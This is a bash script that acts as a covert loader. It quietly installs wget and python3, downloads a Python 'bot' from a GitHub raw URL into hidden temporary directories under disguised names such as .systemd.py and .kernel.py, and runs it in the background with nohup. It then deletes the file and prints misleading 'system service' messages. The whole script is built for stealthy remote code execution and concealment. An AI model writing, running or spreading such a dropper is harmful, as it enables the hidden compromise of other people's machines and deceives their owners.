#!/bin/bash

# Function to check and install dependencies
install_dependencies() {
    echo "Checking system environment..."
    
    # Check for wget and install if missing
    if ! command -v wget >/dev/null 2>&1; then
        echo "Updating system components..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update >/dev/null 2>&1
            apt-get install -y wget >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y wget >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y wget >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm wget >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add wget >/dev/null 2>&1
        elif command -v pkg >/dev/null 2>&1; then
            pkg install -y wget >/dev/null 2>&1
        elif command -v brew >/dev/null 2>&1; then
            brew install wget >/dev/null 2>&1
        else
            echo "System update required"
            return 1
        fi
        
        if ! command -v wget >/dev/null 2>&1; then
            echo "Component installation incomplete"
            return 1
        fi
    fi

    # Check for python3 and install if missing
    if ! command -v python3 >/dev/null 2>&1; then
        echo "Installing runtime..."
        if command -v apt-get >/dev/null 2>&1; then
            apt-get install -y python3 >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y python3 >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y python3 >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            pacman -Sy --noconfirm python >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add python3 >/dev/null 2>&1
        elif command -v pkg >/dev/null 2>&1; then
            pkg install -y python >/dev/null 2>&1
        elif command -v brew >/dev/null 2>&1; then
            brew install python >/dev/null 2>&1
        else
            echo "Runtime installation failed"
            return 1
        fi
        
        if ! command -v python3 >/dev/null 2>&1; then
            echo "Runtime setup incomplete"
            return 1
        fi
    fi
    
    return 0
}

# Function to download and run the bot
deploy_bot() {
    local download_url="https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot.py"
    local temp_dirs=(
        "/tmp" "/var/tmp" "/dev/shm" 
        "/data/data/com.termux/files/usr/tmp"
        "/data/data/com.termux/files/usr/var/tmp"
        "$HOME/.cache" "$HOME/.local/tmp" "$HOME/.config/tmp"
        "$HOME/.temp" "$HOME/.hidden" "$HOME/.cosmic"
        "/sdcard/Android/data/.hidden/tmp"
        "/private/tmp" "/usr/local/tmp"
        "/tmp/.hidden" "/var/tmp/.hidden"
        "/tmp/.X11-unix" "/var/tmp/.system"
    )
    
    # Create additional hidden directories
    mkdir -p "$HOME/.hidden" "$HOME/.cosmic" "/tmp/.hidden" "/var/tmp/.hidden" "/tmp/.X11-unix" 2>/dev/null
    
    for p in "${temp_dirs[@]}"; do
        if [ -d "$p" ] && [ -w "$p" ]; then
            cd "$p" || continue
            
            # Download with retry logic
            for attempt in {1..3}; do
                if wget -q --timeout=30 --tries=3 "$download_url" -O .systemd.py 2>/dev/null; then
                    if [ -f ".systemd.py" ] && [ -s ".systemd.py" ]; then
                        chmod +x .systemd.py 2>/dev/null
                        
                        # Kill any existing instances
                        pkill -f ".systemd.py" 2>/dev/null
                        sleep 1
                        
                        # Start new instance with random name
                        nohup python3 .systemd.py > /dev/null 2>&1 &
                        
                        sleep 2
                        
                        if pgrep -f ".systemd.py" > /dev/null; then
                            # Clean up download file after successful start
                            rm -f .systemd.py 2>/dev/null
                            echo "✓ System service activated"
                            return 0
                        else
                            # Try alternative execution method
                            python3 .systemd.py > /dev/null 2>&1 &
                            sleep 2
                            if pgrep -f ".systemd.py" > /dev/null; then
                                rm -f .systemd.py 2>/dev/null
                                echo "✓ System service activated"
                                return 0
                            fi
                        fi
                    fi
                    rm -f .systemd.py 2>/dev/null
                fi
                sleep 1
            done
        fi
    done
    
    return 1
}

# Function to create a fallback directory and try there
create_fallback_deployment() {
    local fallback_dirs=(
        "$HOME/.cache/system"
        "$HOME/.local/share/data" 
        "/tmp/.$(whoami)"
        "/var/tmp/.$(whoami)"
        "/tmp/.cache"
        "/var/tmp/.data"
    )
    
    for dir in "${fallback_dirs[@]}"; do
        if mkdir -p "$dir" 2>/dev/null; then
            cd "$dir" 2>/dev/null || continue
            
            for i in {1..3}; do
                if wget -q --timeout=45 "$1" -O .kernel.py 2>/dev/null && [ -s .kernel.py ]; then
                    chmod +x .kernel.py
                    nohup python3 .kernel.py > /dev/null 2>&1 &
                    sleep 2
                    
                    if pgrep -f ".kernel.py" > /dev/null; then
                        rm -f .kernel.py 2>/dev/null
                        echo "✓ Background service started"
                        return 0
                    fi
                fi
                sleep 2
            done
        fi
    done
    return 1
}

# Main execution function
main() {
    # Install dependencies first
    if ! install_dependencies; then
        exit 1
    fi
    
    # Try primary deployment
    if deploy_bot; then
        exit 0
    fi
    
    # Try fallback deployment
    local download_url="https://raw.githubusercontent.com/cyrenxxxxx/bot/refs/heads/main/bot.py"
    
    if create_fallback_deployment "$download_url"; then
        exit 0
    fi
    
    # Final attempt - direct download and run
    if wget -q "$download_url" -O .tmp_run.py 2>/dev/null && [ -s .tmp_run.py ]; then
        chmod +x .tmp_run.py
        nohup python3 .tmp_run.py > /dev/null 2>&1 &
        sleep 2
        if pgrep -f ".tmp_run.py" > /dev/null; then
            rm -f .tmp_run.py 2>/dev/null
            echo "✓ Service initialized"
            exit 0
        fi
    fi
    
    exit 1
}

# Run the main function
main
